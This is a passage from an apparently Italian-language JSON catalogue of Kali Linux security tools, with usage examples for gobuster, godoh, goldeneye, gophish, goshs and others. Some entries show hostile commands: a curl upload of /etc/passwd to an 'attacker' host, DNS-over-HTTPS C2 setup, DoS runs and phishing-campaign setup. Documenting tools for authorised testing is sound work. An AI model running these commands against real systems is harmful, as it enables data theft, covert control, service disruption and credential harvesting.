exploit scaricati provengono da fonti pubbliche e potrebbero contenere backdoor o malware. Sempre verificare il codice prima dell'esecuzione e testare in ambiente isolato.</p><p><strong>Alternative Offline:</strong> Per ricerche senza esposizione di rete, usare searchsploit locale o mirror offline di exploit-db. Aggiornare periodicamente con searchsploit -u.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "gitleaks",
    "name": "gitleaks",
    "version": "8.16.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gitleaks/",
    "desc": "Scansiona repository Git per trovare secrets, API key e credenziali hardcoded nel codice.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Gitleaks</strong> è uno scanner SAST (Static Application Security Testing) per trovare secrets hardcoded in repository Git. Rileva API key, password, token, chiavi private e altri dati sensibili nel codice e nella history dei commit. Scritto in Go per performance elevate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Pattern Detection:</strong> Regole per 100+ tipi di secret.</p><p><strong>Git History:</strong> Scansiona tutti i commit, non solo HEAD.</p><p><strong>CI Integration:</strong> Si integra in pipeline CI/CD.</p><p><strong>Baseline:</strong> Ignora secret già noti per ridurre rumore.</p><p><strong>Custom Rules:</strong> Regole configurabili in TOML.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansiona repository locale\ngitleaks detect -s /path/to/repo\n\n# Solo commit recenti\ngitleaks detect -s . --log-opts=\"-n 100\"\n\n# Output JSON\ngitleaks detect -s . -f json -r report.json\n\n# Proteggi prima di commit\ngitleaks protect --staged</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>DevSecOps</strong>, integra in CI/CD per prevenire leak.</p><p>Nel <strong>Bug Bounty</strong>, trova secret in repo pubblici.</p><p><strong>Code Audit</strong> per verificare assenza di credenziali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Defensive:</strong> Tool principalmente difensivo. Aiuta a trovare e rimuovere secret esposti prima che lo facciano gli attaccanti.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "gitxray",
    "name": "gitxray",
    "version": "1.0.18",
    "icon": "../app/icons/gitxray-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gitxray/",
    "desc": "Analizza repository GitHub per trovare contributor, SSH key e pattern sospetti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GitXray</strong> analizza repository GitHub per estrarre informazioni su contributor, chiavi SSH pubbliche, email, pattern di sviluppo e potenziali indicatori di compromissione. Utile per OSINT su sviluppatori e analisi di supply chain software.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Contributor Analysis:</strong> Profila sviluppatori del repo.</p><p><strong>SSH Key Extraction:</strong> Trova chiavi SSH pubbliche degli utenti.</p><p><strong>Email Discovery:</strong> Estrae email dai commit.</p><p><strong>Pattern Analysis:</strong> Identifica comportamenti sospetti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analizza repository\ngitxray -r https://github.com/org/repo\n\n# Analizza organizzazione\ngitxray -o organization_name\n\n# Output JSON\ngitxray -r https://github.com/user/repo -o report.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, profila sviluppatori di un progetto.</p><p>Nella <strong>Supply Chain Security</strong>, analizza contributor di dipendenze.</p><p><strong>Threat Intel</strong> su attori che usano GitHub.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Public Data:</strong> Usa solo dati pubblici GitHub. Rate limiting dell'API può limitare analisi su larga scala.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "gobuster",
    "name": "gobuster",
    "version": "3.8.0",
    "icon": "../app/icons/gobuster-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gobuster/",
    "desc": "Brute forcer in Go per directory web, DNS subdomain, vhost e S3 bucket enumeration.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Gobuster</strong> è un tool di brute forcing scritto in Go per enumerazione di directory web, subdomain DNS, vhost e bucket S3. Estremamente veloce grazie alla concorrenza di Go, è uno dei tool più usati per content discovery. Supporta estensioni, status code filtering e output multipli.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dir Mode:</strong> Enumera directory e file web.</p><p><strong>DNS Mode:</strong> Brute force di subdomain.</p><p><strong>VHost Mode:</strong> Enumera virtual host.</p><p><strong>S3 Mode:</strong> Trova bucket S3 pubblici.</p><p><strong>High Speed:</strong> Scritto in Go per performance.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Directory enum con estensioni, status code e dimensione filtro\ngobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \\\n  -x php,html,txt,bak,old,zip -b 404,403 -s 200,301,302 --exclude-length 0\n\n# VHost discovery con wildcard filtering\ngobuster vhost -u https://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \\\n  --append-domain --exclude-length 301\n\n# Subdomain con resolver custom e rate limit\ngobuster dns -d target.com -w subdomains.txt -r 8.8.8.8 --delay 100ms -t 30\n\n# S3 bucket enumeration\ngobuster s3 -w bucket-names.txt --maxdepth 2\n\n# Fuzzing URL con pattern FUZZ\ngobuster fuzz -u https://target.com/api/v1/FUZZ -w params.txt -b 404\n\n# Pipeline completa: proxy attraverso Burp + output JSON\ngobuster dir -u https://target.com -w wordlist.txt -x php \\\n  --proxy http://127.0.0.1:8080 -o results.json --no-tls-validation -q\n\n# Recursive discovery con profondità\ngobuster dir -u https://target.com -w wordlist.txt -r --depth 3 -t 50</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Recon</strong>, trova directory e file nascosti.</p><p>Nel <strong>Bug Bounty</strong>, enumera subdomain e vhost.</p><p><strong>Pentest</strong> per content discovery completa.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Noisy:</strong> Genera molte request. Usa -t per controllare thread, --delay per rate limiting.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "godoh",
    "name": "godoh",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/godoh/",
    "desc": "C2 agent DNS-over-HTTPS per comunicazioni nascoste che bypassano filtri DNS tradizionali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GoDOH</strong> è un proof-of-concept C2 (Command and Control) che usa DNS-over-HTTPS per comunicazioni. Bypassa filtri DNS tradizionali incapsulando comandi in query DoH verso provider legittimi (Google, Cloudflare). Dimostra come DoH può essere abusato per exfiltration.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>DoH Tunneling:</strong> Usa DNS-over-HTTPS per C2.</p><p><strong>Provider Support:</strong> Google DNS, Cloudflare, altri provider DoH.</p><p><strong>Command Execution:</strong> Esegue comandi sul target.</p><p><strong>Data Exfiltration:</strong> Estrae dati via query DoH.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Server side (attacker)\ngodoh -mode server -domain c2.attacker.com\n\n# Client side (target)\ngodoh -mode client -domain c2.attacker.com -provider google\n\n# Richiede dominio controllato con record DNS configurati</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, C2 che bypassa filtri DNS.</p><p>Nella <strong>Research</strong>, dimostra rischi di DoH.</p><p><strong>Detection Engineering</strong> per sviluppare contromisure.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> DoH a provider noti (Google, Cloudflare) può essere monitorato. Richiede infrastruttura DNS propria per funzionare.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "goldeneye",
    "name": "goldeneye",
    "version": "1.2.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/goldeneye/",
    "desc": "HTTP DoS test tool che usa Keep-Alive e pipelining per stress testing di web server.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GoldenEye</strong> è un tool per stress testing HTTP che sfrutta le funzionalità Keep-Alive e HTTP pipelining per consumare risorse del web server target. Mantiene molte connessioni TCP aperte simultaneamente inviando request HTTP incomplete o rallentate, esaurendo progressivamente i worker thread/processi disponibili sul server. È un tool di tipo \"Slowloris-style\" scritto in Python che permette di verificare la resilienza dell'infrastruttura web contro attacchi di tipo application-layer DoS. IMPORTANTE: da utilizzare esclusivamente per testing autorizzato su propri sistemi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Keep-Alive Connection Abuse:</strong> mantiene connessioni HTTP aperte il più a lungo possibile sfruttando Keep-Alive, occupando slot di connessione sul server e impedendo a client legittimi di connettersi quando i worker sono esauriti.</p><p><strong>Randomized Request Headers:</strong> genera User-Agent, Referer e altri header HTTP casuali per ogni connessione, rendendo più difficile il blocking basato su signature e simulando traffico da client diversi.</p><p><strong>Multi-threaded Architecture:</strong> gestisce centinaia o migliaia di connessioni parallele distribuite su multiple thread, massimizzando la pressione sulle risorse del server target.</p><p><strong>Configurable Attack Parameters:</strong> permette di configurare numero di worker, socket per worker, metodo HTTP (GET/POST), e altri parametri per calibrare l'intensità del test in base alle caratteristiche del target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># ATTENZIONE: SOLO SU SISTEMI PROPRI CON AUTORIZZAZIONE!\n\n# Test base con parametri default\ngoldeneye http://your-server.com\n\n# Con numero specifico di worker e socket\ngoldeneye http://your-server.com -w 100 -s 500\n\n# Usando metodo POST\ngoldeneye http://your-server.com -m POST\n\n# Con debug output\ngoldeneye http://your-server.com -d\n\n# Test specifico endpoint\ngoldeneye http://your-server.com/api/endpoint -w 50 -s 100</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Server Stress Testing</strong>, verificare la resilienza e i limiti della propria infrastruttura web contro attacchi di tipo slowloris e connection exhaustion prima del deployment in produzione.</p><p>Per <strong>Capacity Planning</strong>, determinare quante connessioni simultanee il server può gestire e identificare i colli di bottiglia nell'architettura per dimensionare correttamente le risorse.</p><p>Per <strong>WAF/DoS Protection Testing</strong>, verificare che le protezioni anti-DoS implementate (rate limiting, connection limits, WAF rules) funzionino correttamente nel bloccare questo tipo di attacchi.</p><p>Per <strong>Incident Response Training</strong>, simulare attacchi DoS in ambiente controllato per addestrare il team a riconoscere e rispondere a questo tipo di incidenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>ATTENZIONE LEGALE:</strong> utilizzare ESCLUSIVAMENTE su sistemi propri o con autorizzazione scritta esplicita. Gli attacchi DoS sono reati penali in quasi tutte le giurisdizioni. Questo tool è destinato esclusivamente a stress testing legittimo e security assessment autorizzato, non per attacchi. Anche test autorizzati possono causare disservizi - pianificare finestre di manutenzione appropriate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "goofile",
    "name": "goofile",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/goofile/",
    "desc": "Cerca file specifici (PDF, DOC, XLS) su un dominio usando Google dorks automatizzati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Goofile</strong> è un tool OSINT che automatizza la ricerca di file di specifiche tipologie su un dominio target utilizzando Google dorks. Costruisce automaticamente query \"site:domain.com filetype:ext\" per trovare documenti PDF, DOC, DOCX, XLS, XLSX, PPT, PPTX e molti altri formati indicizzati da Google. I file trovati rappresentano una miniera di informazioni per la reconnaissance: possono contenere metadati sensibili (autori, software, path interni), indirizzi email, username, informazioni sulla struttura organizzativa e dati che non dovrebbero essere pubblici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Automated Google Dorking:</strong> costruisce e esegue automaticamente query Google con operatori site: e filetype: per ogni tipo di file richiesto, gestendo paginazione dei risultati per ottenere liste complete.</p><p><strong>Multiple File Type Support:</strong> supporta ricerca di PDF, DOC/DOCX, XLS/XLSX, PPT/PPTX, TXT, RTF, ODT, e qualsiasi altra estensione file indicizzabile da Google.</p><p><strong>Domain-Scoped Search:</strong> limita la ricerca esclusivamente al dominio target specificato, filtrando risultati da altri siti e focalizzando la reconnaissance.</p><p><strong>Clean URL Output:</strong> genera lista pulita di URL diretti ai file trovati, pronta per download massivo con wget/curl o analisi con tool di metadata extraction come FOCA o ExifTool.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca documenti PDF su un dominio\ngoofile -d target.com -f pdf\n\n# Cerca documenti Word\ngoofile -d target.com -f doc\ngoofile -d target.com -f docx\n\n# Cerca spreadsheet Excel\ngoofile -d target.com -f xls\ngoofile -d target.com -f xlsx\n\n# Cerca presentazioni PowerPoint\ngoofile -d target.com -f ppt\n\n# Workflow completo OSINT:\n# 1. Trova file\ngoofile -d target.com -f pdf &gt; pdf_urls.txt\n\n# 2. Scarica tutti i PDF\nwget -i pdf_urls.txt -P ./downloads/\n\n# 3. Estrai metadata con exiftool\nexiftool ./downloads/*.pdf\n\n# 4. Oppure usa FOCA per analisi approfondita</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT &amp; Reconnaissance</strong>, trovare documenti pubblicamente accessibili che rivelano informazioni sulla struttura interna, progetti, dipendenti e tecnologie utilizzate dal target.</p><p>Per <strong>Metadata Extraction</strong>, raccogliere file per estrarre metadati con tool come FOCA, ExifTool o Metagoofil - spesso rivelano username, path di rete interni, versioni software e altre informazioni sensibili.</p><p>Per <strong>Information Leakage Assessment</strong>, identificare documenti che contengono informazioni che non dovrebbero essere pubbliche (policy interne, credenziali, dati personali) per security assessment.</p><p>Per <strong>Social Engineering Preparation</strong>, raccogliere nomi, ruoli ed email da documenti per preparare campagne di spear phishing mirate e credibili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive Reconnaissance:</strong> il tool interroga solo Google, non contatta direttamente il target, rendendo questa fase di reconnaissance completamente passiva e non rilevabile. Tuttavia, Google può applicare rate limiting o CAPTCHA per query frequenti. Per analisi approfondita dei metadata, combinare con FOCA o Metagoofil dopo il download dei file.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "gophish",
    "name": "gophish",
    "version": "0.12.1",
    "icon": "../app/icons/gophish-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gophish/",
    "desc": "Framework open source per campagne di phishing con tracking, template e reporting.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GoPhish</strong> è il framework open source di riferimento per simulazioni di phishing e programmi di security awareness training. Gestisce l'intero ciclo di vita delle campagne di phishing: creazione di email convincenti con editor template, costruzione di landing page per credential harvesting, gestione di gruppi di utenti target, invio programmato delle email, tracking granulare di aperture/click/submit, e reporting dettagliato con metriche e grafici. L'interfaccia web moderna e intuitiva rende accessibile la creazione di campagne professionali anche senza competenze tecniche avanzate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Email Template Editor:</strong> editor WYSIWYG completo per creare email di phishing convincenti con supporto HTML, variabili dinamiche (nome, cognome, email del target), allegati e tracking pixel invisibile per monitorare le aperture.</p><p><strong>Landing Page Builder:</strong> crea pagine di login realistiche che clonano siti reali (Office 365, Google, banking) per catturare credenziali, con supporto per redirect post-submit e capture di dati custom.</p><p><strong>Campaign Management:</strong> gestisce gruppi di utenti target importabili da CSV, scheduling di invio con throttling per evitare spam filter, e A/B testing di template diversi per ottimizzare i risultati.</p><p><strong>Real-time Tracking &amp; Analytics:</strong> dashboard in tempo reale che traccia email inviate, aperture (via tracking pixel), click sui link, credenziali inserite e timeline completa delle interazioni per ogni utente target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia il server GoPhish\n./gophish\n\n# Accedi alla dashboard web\n# URL: https://localhost:3333\n# Credenziali default: admin / gophish (cambiare subito!)\n\n# Setup workflow:\n# 1. Sending Profile: configura SMTP server per invio\n#    - Server SMTP (proprio o servizio come SendGrid)\n#    - Email mittente e nome visualizzato\n#    - Test invio per verificare configurazione\n\n# 2. Email Template: crea email di phishing\n#    - Importa HTML o usa editor WYSIWYG\n#    - Aggiungi variabili: {{.FirstName}}, {{.Email}}\n#    - Includi link tracciato: {{.URL}}\n\n# 3. Landing Page: crea pagina di harvesting\n#    - Importa sito esistente o crea da zero\n#    - Configura campi da catturare\n#    - Imposta redirect post-submit\n\n# 4. Users &amp; Groups: importa target\n#    - Upload CSV con nome, cognome, email\n#    - Organizza in gruppi per campagne diverse\n\n# 5. Campaign: lancia la campagna\n#    - Seleziona template, landing, gruppo\n#    - Imposta schedule e URL tracking\n#    - Monitora risultati in real-time</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Security Awareness Training</strong>, condurre programmi strutturati di formazione anti-phishing testando i dipendenti con simulazioni realistiche e fornendo feedback educativo immediato a chi cade nella trappola.</p><p>Per <strong>Red Team Engagements</strong>, eseguire campagne di phishing controllate come vettore di initial access durante penetration test, con tracking completo per il report finale.</p><p>Per <strong>Compliance &amp; Audit</strong>, dimostrare l'implementazione di programmi di security awareness richiesti da normative (GDPR, ISO 27001, PCI-DSS) con metriche e report esportabili.</p><p>Per <strong>Phishing Resilience Metrics</strong>, misurare nel tempo il miglioramento della resistenza al phishing dell'organizzazione attraverso campagne periodiche con metriche comparabili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Autorizzazione Obbligatoria:</strong> richiede SEMPRE autorizzazione scritta esplicita dal management e coordinamento con HR/Legal. Configurare correttamente SPF, DKIM e DMARC per massimizzare deliverability ed evitare che le email finiscano in spam. Non utilizzare MAI per phishing non autorizzato - è reato penale. Considerare l'impatto psicologico sui dipendenti e prevedere comunicazione post-campagna.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Social_Engineering"
    ],
    "notes": null
  },
  {
    "id": "goshs",
    "name": "goshs",
    "version": "1.1.0",
    "icon": "../app/icons/goshs-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/goshs/",
    "desc": "SimpleHTTPServer in Go con upload, WebDAV, SSL e auth per file transfer rapido.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GoSHS</strong> (Go Simple HTTP Server) è una versione potenziata e moderna del classico Python SimpleHTTPServer, riscritta in Go per performance e portabilità. Aggiunge funzionalità essenziali per penetration testing e red team operations: upload di file bidirezionale, supporto WebDAV per mount remoto come drive di rete, SSL/TLS con certificati auto-generati, autenticazione HTTP Basic, directory listing personalizzabile e logging dettagliato. È il tool perfetto per trasferimento file rapido durante engagement, hosting di payload e raccolta di dati esfiltrati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Bidirectional File Transfer:</strong> oltre al classico download, permette upload di file dal client al server tramite interfaccia web o curl, essenziale per ricevere output di comandi, dump di credenziali e altri dati dal target compromesso.</p><p><strong>WebDAV Support:</strong> espone la directory come share WebDAV permettendo ai client di montarla come drive di rete, utile per trasferire file da sistemi Windows che possono mappare network drive.</p><p><strong>SSL/TLS Encryption:</strong> genera automaticamente certificati self-signed per connessioni HTTPS, proteggendo il traffico da intercettazione durante trasferimenti su reti non trusted.</p><p><strong>HTTP Basic Authentication:</strong> protegge il server con username e password, impedendo accesso non autorizzato ai file esposti e tracciando chi si connette.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Server HTTP base sulla porta 8000\ngoshs\n\n# Con upload abilitato (essenziale per ricevere file)\ngoshs -u\n\n# Con SSL/TLS per connessioni cifrate\ngoshs -s\n\n# Porta e directory custom\ngoshs -p 8080 -d /path/to/share\n\n# Con autenticazione HTTP Basic\ngoshs -U pentester -P secretpass\n\n# Combinazione completa per engagement\ngoshs -u -s -p 443 -U user -P pass -d ./loot\n\n# WebDAV mode\ngoshs -w -d /path/to/share\n\n# Download da target Windows (PowerShell)\nInvoke-WebRequest -Uri http://attacker:8000/tool.exe -OutFile tool.exe\n\n# Upload da target Linux\ncurl -F \"file=@/etc/passwd\" http://attacker:8000/upload\n\n# Mount WebDAV su Windows\nnet use Z: http://attacker:8000/webdav</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>File Transfer During Engagement</strong>, trasferire rapidamente tool, exploit e payload verso il target compromesso, e ricevere output, dump e loot dal target verso la macchina attaccante.</p><p>Per <strong>Payload Hosting</strong>, servire payload malevoli, script PowerShell, binari e altri file che il target deve scaricare durante l'exploitation, con supporto HTTPS per evitare detection.</p><p>Per <strong>Data Exfiltration Receiver</strong>, ricevere dati esfiltrati dal target quando può effettuare connessioni HTTP/HTTPS outbound verso l'attaccante.</p><p>Per <strong>Staging Server</strong>, creare rapidamente un server temporaneo per staging di file durante operazioni red team senza necessità di infrastruttura complessa.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Exposure Control:</strong> non esporre mai su internet senza autenticazione - chiunque potrebbe accedere ai file. Usare sempre SSL per evitare intercettazione del traffico e delle credenziali. Il server logga tutte le connessioni - utile per tracking ma anche potenziale IoC. Considerare firewall rules per limitare chi può connettersi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "gospider",
    "name": "gospider",
    "version": "1.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gospider/",
    "desc": "Web spider veloce in Go per crawling, estrazione link, JS parsing e sitemap discovery.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GoSpider</strong> è un web spider ad alte prestazioni scritto in Go, progettato per crawling veloce e completo di siti web durante reconnaissance. Estrae URL da multiple sorgenti: parsing HTML per link e form, analisi di file JavaScript per endpoint API nascosti, parsing di sitemap.xml e robots.txt, e integrazione con Wayback Machine per URL storici. L'output pulito e strutturato è facilmente integrabile in pipeline con altri tool (httpx, nuclei, ffuf) per una reconnaissance web completa e automatizzata.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>High-Performance Crawling:</strong> scritto in Go con goroutine per crawling parallelo ad alta velocità, gestisce migliaia di URL rapidamente con controllo granulare su concorrenza, timeout e retry.</p><p><strong>JavaScript URL Extraction:</strong> parsing intelligente di file JavaScript per estrarre endpoint API, URL hardcoded, path di risorse e altri URL nascosti che non appaiono nell'HTML ma sono usati dall'applicazione.</p><p><strong>Multi-Source Discovery:</strong> analizza automaticamente sitemap.xml per struttura completa del sito, robots.txt per path \"nascosti\" che il sito vuole escludere dai motori, e form HTML per endpoint di submit.</p><p><strong>Wayback Machine Integration:</strong> interroga Internet Archive per recuperare URL storici del dominio, rivelando endpoint deprecati, pagine rimosse e path che potrebbero essere ancora accessibili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Crawl base di un sito\ngospider -s https://target.com\n\n# Con profondità di crawling specificata\ngospider -s https://target.com -d 3\n\n# Include URL da Wayback Machine\ngospider -s https://target.com --wayback\n\n# Include URL da altri archivi (CommonCrawl, VirusTotal)\ngospider -s https://target.com --other-source\n\n# Output su file\ngospider -s https://target.com -o ./output/\n\n# Con concorrenza e delay custom\ngospider -s https://target.com -c 10 --delay 100\n\n# Crawl di lista siti\ngospider -S sites.txt -o ./output/ -c 5\n\n# Pipeline completa bug bounty:\ngospider -s https://target.com -d 2 --wayback --other-source -o raw_urls.txt\ncat raw_urls.txt | httpx -silent | nuclei -t nuclei-templates/\n\n# Solo JavaScript files\ngospider -s https://target.com --js</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Application Reconnaissance</strong>, mappare completamente la struttura di un sito web identificando tutte le pagine, endpoint, risorse e funzionalità esposte come primo step di un assessment.</p><p>Per <strong>Bug Bounty Hunting</strong>, scoprire endpoint nascosti in file JavaScript, path storici da Wayback Machine e URL che potrebbero contenere vulnerabilità non testate.</p><p>Per <strong>Attack Surface Discovery</strong>, identificare tutti i punti di ingresso di un'applicazione web per pianificare test di sicurezza mirati e completi.</p><p>Per <strong>Automated Security Pipelines</strong>, integrare in workflow automatizzati con httpx per probing, nuclei per vulnerability scanning e altri tool per reconnaissance su larga scala.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active Reconnaissance:</strong> il crawling genera traffico HTTP significativo verso il target ed è facilmente loggabile. Rispettare robots.txt se richiesto dalle regole di engagement. Usare rate limiting (--delay) per ridurre l'impatto e evitare ban. User-Agent è configurabile per blending.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "Crawling",
      "Active"
    ],
    "notes": null
  },
  {
    "id": "gowitness",
    "name": "gowitness",
    "version": "3.0.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gowitness/",
    "desc": "Screenshot tool web in Go con headless Chrome per recon visuale su larga scala.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GoWitness</strong> è un tool per catturare screenshot di siti web scritto in Go, progettato per visual reconnaissance su larga scala. Utilizza headless Chrome/Chromium per rendering accurato di pagine web moderne (incluse SPA JavaScript-heavy) e supporta scansione massiva di migliaia di URL. Rappresenta un'alternativa più leggera e veloce a EyeWitness, con database SQLite integrato per gestione persistente dei risultati, server web per visualizzazione gallery, e supporto per import da Nmap e altri tool di discovery.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Headless Chrome Rendering:</strong> utilizza Chrome/Chromium in modalità headless per screenshot pixel-perfect di pagine web, con rendering completo di JavaScript, CSS e contenuti dinamici per catturare esattamente ciò che un utente vedrebbe.</p><p><strong>Mass URL Processing:</strong> processa migliaia di URL in parallelo con controllo su concorrenza, timeout e retry, ideale per screenshot di intere subnet o liste di asset discovery.</p><p><strong>SQLite Results Database:</strong> archivia tutti i risultati (screenshot, URL, titoli, header) in database SQLite queryable, permettendo analisi offline, ricerche e report strutturati.</p><p><strong>Built-in Web Gallery:</strong> server web integrato che presenta i risultati in una gallery navigabile con thumbnail, filtri e ricerca, perfetto per triage visuale e condivisione con il team.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Screenshot di singolo URL\ngowitness single https://target.com\n\n# Screenshot da file con lista URL\ngowitness file -f urls.txt\n\n# Da output Nmap XML (screenshot di tutti i web server trovati)\ngowitness nmap -f nmap_scan.xml\n\n# Con opzioni di concorrenza e timeout\ngowitness file -f urls.txt --threads 10 --timeout 30\n\n# Specificando dimensioni viewport\ngowitness single https://target.com --resolution 1920x1080\n\n# Avvia web server per visualizzare risultati\ngowitness server\n# Poi naviga a http://localhost:7171\n\n# Export report\ngowitness report export --format html -o report.html\n\n# Pipeline con altri tool:\n# 1. Discovery con httpx\ncat hosts.txt | httpx -silent &gt; live_urls.txt\n# 2. Screenshot con gowitness\ngowitness file -f live_urls.txt\n# 3. Review nella gallery\ngowitness server</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Visual Reconnaissance</strong>, effettuare triage rapido di centinaia di web server identificando visivamente applicazioni interessanti, login page, dashboard e target prioritari per analisi approfondita.</p><p>Per <strong>Bug Bounty Scope Review</strong>, screenshottare tutti gli asset in scope per identificare rapidamente applicazioni custom, tecnologie riconoscibili e potenziali target di alto valore.</p><p>Per <strong>Asset Documentation</strong>, documentare la superficie web di un'organizzazione con screenshot datati per tracking delle modifiche nel tempo e report di assessment.</p><p>Per <strong>Penetration Test Reporting</strong>, includere screenshot delle applicazioni testate nel report finale per contestualizzare le vulnerabilità trovate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active Reconnaissance:</strong> effettua connessioni HTTP/HTTPS a tutti i target per il rendering, generando traffico loggabile. User-Agent di Chrome è identificabile ma comune. Richiede Chrome/Chromium installato sul sistema. Considerare rate limiting per evitare ban su target sensibili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "Visual_Recon"
    ],
    "notes": null
  },
  {
    "id": "gpp-decrypt",
    "name": "gpp-decrypt",
    "version": "0.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gpp-decrypt/",
    "desc": "Decripta password cpassword da Group Policy Preferences (GPP) di Active Directory.",
